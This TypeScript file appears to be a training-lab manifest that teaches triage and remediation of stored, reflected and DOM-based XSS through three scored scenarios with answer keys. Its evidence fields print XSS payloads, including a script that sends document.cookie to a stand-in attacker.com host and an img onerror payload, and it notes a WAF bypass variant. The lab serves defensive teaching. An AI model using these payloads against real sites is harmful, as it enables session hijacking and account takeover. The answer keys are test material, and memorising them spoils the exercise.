import type { LabManifest } from "../../types/manifest";

export const xssIdentificationLab: LabManifest = {
  schemaVersion: "1.1",
  id: "xss-identification",
  version: 1,
  title: "Cross-Site Scripting (XSS) Identification",

  tier: "intermediate",
  track: "vulnerability-hardening",
  difficulty: "moderate",
  accessLevel: "free",
  tags: ["xss", "cross-site-scripting", "web-security", "owasp", "csp", "dom"],

  description:
    "Triage and remediate cross-site scripting vulnerabilities by classifying reflected, stored, and DOM-based XSS findings, assessing their impact, and selecting appropriate fixes.",
  estimatedMinutes: 12,
  learningObjectives: [
    "Distinguish reflected, stored, and DOM-based XSS vulnerability types",
    "Assess XSS severity based on context and potential for session hijacking",
    "Select appropriate output encoding and CSP remediation strategies",
  ],
  sortOrder: 510,

  status: "published",
  prerequisites: [],

  rendererType: "triage-remediate",

  scenarios: [
    {
      type: "triage-remediate",
      id: "xss-001",
      title: "Stored XSS in Product Review Field",
      description:
        "A bug bounty researcher submitted a report demonstrating XSS in the product review section of an e-commerce platform. Classify and determine remediation.",
      evidence: [
        {
          type: "Proof of Concept",
          content:
            'Payload: <script>document.location=\'https://attacker.com/steal?c=\'+document.cookie</script> submitted as a product review. Payload is stored in the database and rendered to all users viewing the product page without sanitization.',
        },
        {
          type: "Impact Assessment",
          content:
            "Review pages receive ~15,000 page views per day. Session cookies are not HttpOnly. Payload executes in the victim's browser context, enabling cookie theft, session hijacking, and account takeover for all viewing users.",
        },
        {
          type: "Code Review",
          content:
            "Template renders reviews as: <div class=\"review\">{{ review.text }}</div> using Django's mark_safe() — this explicitly bypasses auto-escaping. No CSP headers present.",
        },
        {
          type: "CVSS Score",
          content:
            "CVSS 3.1: 8.8 (High) — Network attack vector, no auth required to submit review, high confidentiality/integrity impact due to session theft capability.",
        },
      ],
      classifications: [
        { id: "stored-xss", label: "Stored XSS — High Severity", description: "Malicious script persisted in database, executes for all visitors" },
        { id: "reflected-xss", label: "Reflected XSS — Medium Severity", description: "Script reflected in single response, requires user to click crafted link" },
        { id: "dom-xss", label: "DOM-Based XSS — Low Severity", description: "Script executes via client-side DOM manipulation only" },
        { id: "false-positive", label: "False Positive — Not Exploitable", description: "Script tags present but cannot execute in this context" },
      ],
      correctClassificationId: "stored-xss",
      remediations: [
        { id: "encode-remove-csp", label: "Remove mark_safe(), enable auto-escaping, add HttpOnly cookies, deploy CSP", description: "Fix root cause in template, harden session cookies, add Content Security Policy" },
        { id: "waf-only", label: "Add WAF rule to block script tags", description: "Block script tags at the WAF without changing application code" },
        { id: "encode-only", label: "HTML-encode the review field only", description: "Apply output encoding to the review field without other changes" },
        { id: "delete-review", label: "Delete the malicious review only", description: "Remove the specific malicious review and monitor for recurrence" },
      ],
      correctRemediationId: "encode-remove-csp",
      rationales: [
        {
          id: "rat-stored-full",
          text: "Stored XSS affecting 15K daily visitors with no HttpOnly cookies is a critical exposure. The full remediation — removing mark_safe(), enabling auto-escaping, HttpOnly cookies, and CSP — addresses the root cause, hardens the cookie surface, and adds a content-level defense. Any partial fix leaves significant risk.",
        },
        {
          id: "rat-waf-bypass",
          text: "WAF-only remediation is easily bypassed with encoding variants like <scr&#105;pt> or SVG event handlers. It's a compensating control, not a fix.",
        },
      ],
      correctRationaleId: "rat-stored-full",
      feedback: {
        perfect: "Correct. Stored XSS with session hijacking potential and 15K daily victims is the highest-severity XSS type. The full remediation — fix the template, HttpOnly cookies, and CSP — provides defense in depth.",
        partial: "You classified it correctly but the remediation is incomplete. A WAF rule or encoding alone doesn't fix the root cause or protect sessions already active.",
        wrong: "This is stored XSS, not reflected or DOM-based. The mark_safe() bypass and missing HttpOnly cookies are both critical issues requiring code changes.",
      },
    },
    {
      type: "triage-remediate",
      id: "xss-002",
      title: "Reflected XSS in Error Message",
      description:
        "Security scan found a reflected XSS in the application's 404 error page. Assess its exploitability and determine remediation priority.",
      evidence: [
        {
          type: "Vulnerability Details",
          content:
            "URL: /notfound?path=<script>alert(1)</script> — The path parameter is reflected directly in the error page body: 'The page /path/you/requested was not found.' No encoding applied.",
        },
        {
          type: "Exploitability Context",
          content:
            "To exploit, an attacker must craft a URL and trick a victim into clicking it. Session cookies are HttpOnly — cannot be stolen via document.cookie. CSP header present: Content-Security-Policy: default-src 'self' — inline scripts are blocked.",
        },
        {
          type: "Browser Testing",
          content:
            "Chrome, Firefox, Edge: CSP blocks inline script execution. XSS auditor (legacy IE) would have blocked this regardless. The payload renders as visible text in modern browsers due to CSP.",
        },
        {
          type: "CVSS Score",
          content:
            "CVSS 3.1: 4.3 (Medium) — Network vector, user interaction required, but severely limited by CSP and HttpOnly cookies. No practical session theft possible in current configuration.",
        },
      ],
      classifications: [
        { id: "reflected-medium", label: "Reflected XSS — Medium Priority", description: "Exploitable but requires user interaction; CSP and HttpOnly limit impact" },
        { id: "stored-high", label: "Stored XSS — Critical", description: "Persisted payload, extremely high risk" },
        { id: "low-risk", label: "Reflected XSS — Low Priority", description: "Technically present but effectively mitigated by existing controls" },
        { id: "not-exploitable", label: "Not Exploitable — Close", description: "Cannot be exploited in any form due to controls" },
      ],
      correctClassificationId: "reflected-medium",
      remediations: [
        { id: "encode-schedule", label: "Schedule output encoding fix in next sprint", description: "Add proper HTML encoding to path parameter in error page; not emergency priority" },
        { id: "emergency-patch", label: "Emergency patch within 24 hours", description: "Treat as critical — immediate code fix required" },
        { id: "no-action", label: "No action — CSP fully mitigates", description: "CSP makes this unexploitable; no code change needed" },
        { id: "disable-error-page", label: "Disable the 404 error page", description: "Return a generic error without displaying the path" },
      ],
      correctRemediationId: "encode-schedule",
      rationales: [
        {
          id: "rat-mitigated-medium",
          text: "The vulnerability is real but its practical impact is severely limited by the existing CSP and HttpOnly cookies. It's not an emergency requiring a 24-hour patch, but output encoding should be scheduled to eliminate it properly. CSP alone isn't reliable long-term as policies can change.",
        },
        {
          id: "rat-emergency",
          text: "CSP blocks inline script execution in all modern browsers. While fixing the root cause is correct, emergency priority is not warranted when impact is effectively mitigated.",
        },
        {
          id: "rat-no-action",
          text: "CSP mitigates the current impact but security controls can be modified. The root cause should be fixed to remove the dependency on compensating controls.",
        },
      ],
      correctRationaleId: "rat-mitigated-medium",
      feedback: {
        perfect: "Good risk calibration. The CSP and HttpOnly cookies genuinely limit this reflected XSS. Scheduling the output encoding fix in the next sprint is proportional — it removes the root cause without creating false urgency.",
        partial: "Your classification is right but the remediation priority is off. CSP blocking inline scripts means this isn't emergency-worthy, though it should be fixed.",
        wrong: "Taking no action relies entirely on compensating controls. CSP policies can change, and browsers evolve. Fix the output encoding to eliminate the dependency.",
      },
    },
    {
      type: "triage-remediate",
      id: "xss-003",
      title: "DOM-Based XSS via URL Fragment",
      description:
        "A penetration tester found DOM-based XSS in a single-page application. Evaluate the severity and remediation approach.",
      evidence: [
        {
          type: "Technical Details",
          content:
            "Vulnerability in SPA routing: document.getElementById('content').innerHTML = decodeURIComponent(location.hash.substring(1)). Payload: https://app.company.com/page#<img src=x onerror=alert(document.cookie)>",
        },
        {
          type: "Impact Analysis",
          content:
            "Session cookies: HttpOnly=true (not accessible via JS). App uses JWT in localStorage — accessible via JS. Payload can steal JWT tokens from localStorage, enabling session hijacking without cookie access.",

        },
        {
          type: "Exploitation Requirement",
          content:
            "Attacker must host a page that redirects to the crafted URL, or convince the user to click a malicious link. No self-XSS — must involve social engineering.",
        },
        {
          type: "CSP Status",
          content:
            "No CSP headers configured. No XSS filtering at server side (DOM XSS occurs entirely client-side — server never sees the payload).",

        },
      ],
      classifications: [
        { id: "dom-high", label: "DOM-Based XSS — High Severity", description: "JWT in localStorage is accessible, enabling session hijacking" },
        { id: "dom-low", label: "DOM-Based XSS — Low Severity", description: "Server-side controls make this low risk" },
        { id: "not-xss", label: "Not XSS — Client-Side Only", description: "Client-side behavior is outside security scope" },
        { id: "reflected-medium", label: "Reflected XSS — Medium Severity", description: "Reflected in the URL, medium-risk" },
      ],
      correctClassificationId: "dom-high",
      remediations: [
        { id: "fix-dom-csp-jwt", label: "Replace innerHTML with textContent, add CSP, move JWT to HttpOnly cookie", description: "Fix the DOM sink, add CSP, and remove localStorage JWT to eliminate the attack chain" },
        { id: "fix-dom-only", label: "Replace innerHTML with textContent only", description: "Fix the immediate vulnerability without addressing JWT storage" },
        { id: "server-filter", label: "Add server-side input filtering for the hash fragment", description: "Filter dangerous characters on the server before page load" },
        { id: "user-training", label: "Train users not to click suspicious links", description: "Security awareness training as the primary control" },
      ],
      correctRemediationId: "fix-dom-csp-jwt",
      rationales: [
        {
          id: "rat-dom-jwt",
          text: "DOM-based XSS with JWT in localStorage is high severity — the attacker can steal authentication tokens even with HttpOnly cookies. The complete fix addresses all three issues: replace the unsafe innerHTML sink, add CSP to block execution, and move JWT from localStorage to HttpOnly cookies to remove the target.",
        },
        {
          id: "rat-dom-partial",
          text: "Fixing the innerHTML sink alone prevents this specific vector but leaves JWT in localStorage exposed to future XSS from other sinks. Full remediation requires all three actions.",
        },
        {
          id: "rat-server-filter",
          text: "The hash fragment is never sent to the server — server-side filtering cannot inspect or block it.",
        },
      ],
      correctRationaleId: "rat-dom-jwt",
      feedback: {
        perfect: "Excellent analysis. DOM XSS with JWT in localStorage is high severity — HttpOnly cookies provide no protection when tokens are stored in JS-accessible storage. The three-part fix addresses the sink, the execution context, and the token storage.",
        partial: "You got the classification right but the remediation is incomplete. Fixing the sink alone doesn't address the JWT storage vulnerability — move it to HttpOnly cookies.",
        wrong: "DOM-based XSS is server-invisible — server-side filtering cannot stop hash fragment attacks. The client-side fix must address both the sink and the token storage.",
      },
    },
  ],

  hints: [
    "Stored XSS is almost always higher severity than reflected — it affects every visitor, not just users who click a crafted link.",
    "CSP and HttpOnly cookies genuinely reduce XSS impact — factor existing mitigations into your severity rating.",
    "DOM XSS with localStorage JWTs can be as dangerous as stored XSS — HttpOnly cookies don't protect data stored in JavaScript-accessible storage.",
  ],

  scoring: {
    maxScore: 100,
    hintPenalty: 5,
    penalties: { perfect: 0, partial: 10, wrong: 20 },
    passingThresholds: { pass: 80, partial: 50 },
  },

  careerInsight:
    "XSS is the most prevalent web vulnerability in bug bounty programs. Application security engineers need to understand all three XSS types and know when CSP and HttpOnly cookies genuinely mitigate risk.",
  toolRelevance: [
    "Burp Suite Pro",
    "OWASP ZAP",
    "DOMPurify (sanitization library)",
    "CSP Evaluator (Google)",
  ],

  createdAt: "2026-03-27",
  updatedAt: "2026-03-27",
};
